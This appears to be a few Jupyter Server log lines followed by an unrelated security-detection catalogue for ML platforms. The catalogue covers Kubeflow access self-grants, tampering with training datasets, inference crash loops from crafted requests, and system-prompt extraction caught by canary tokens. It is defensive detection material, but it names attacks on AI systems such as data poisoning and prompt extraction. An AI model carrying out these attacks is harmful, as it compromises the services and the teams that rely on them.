[I 2026-11-12 13:44:02.120 ServerApp] Jupyter Server 2.14.2 is running at: http://0.0.0.0:8888/lab
[I 2026-11-12 13:51:40.551 ServerApp] New terminal with automatic name: 1
[I 2026-11-12 13:51:40.552 ServerApp] 201 POST /api/terminals (203.0.113.66) 4.12ms

usecases.name: User grants themselves access to another team's Kubeflow profile
usecases.description: Kubeflow profiles isolate teams' notebooks, pipelines and data credentials. A contributor binding added to another team's namespace breaks multi-team isolation on a shared GPU platform.
usecases.detection: RoleBinding creation in a profile namespace (annotations role and user) where the subject is not a member of that team's IdP group, or where the subject granted the access to themselves.

usecases.name: Curated training dataset changed outside the data pipeline
usecases.description: Fine-tuning and evaluation sets are small enough that a few thousand edited labels or injected samples can plant a backdoor. Commits to curated datasets should come only from the reviewed data pipeline.
log_sources: Data versioning audit logs (lakeFS, DVC, Delta Lake history)
usecases.detection: Commits or object writes to curated or gold dataset branches by human identities or unknown clients, or label distribution shifts beyond a threshold between versions.

usecases.name: Inference server crash loop triggered by crafted requests
usecases.description: Malformed multimodal inputs, extreme parameters or known parser bugs can crash GPU model servers. Repeated crashes tied to one client are a denial-of-service attempt against the AI service.
usecases.detection: 3 or more restarts of an inference pod in 10 minutes with CUDA errors or OOMKilled, where the last requests before each crash share a client, API key or payload pattern.

usecases.name: System prompt leaked in a model response (canary token hit)
usecases.description: System prompts hold business rules, tool schemas and sometimes credentials. A response that contains the canary planted in the system prompt, or closely matches the prompt itself, means it was extracted.
usecases.detection: Any response containing a system-prompt canary token, or with high similarity (above 0.8) to the deployed system prompt. Group by user or API key to find extraction campaigns.
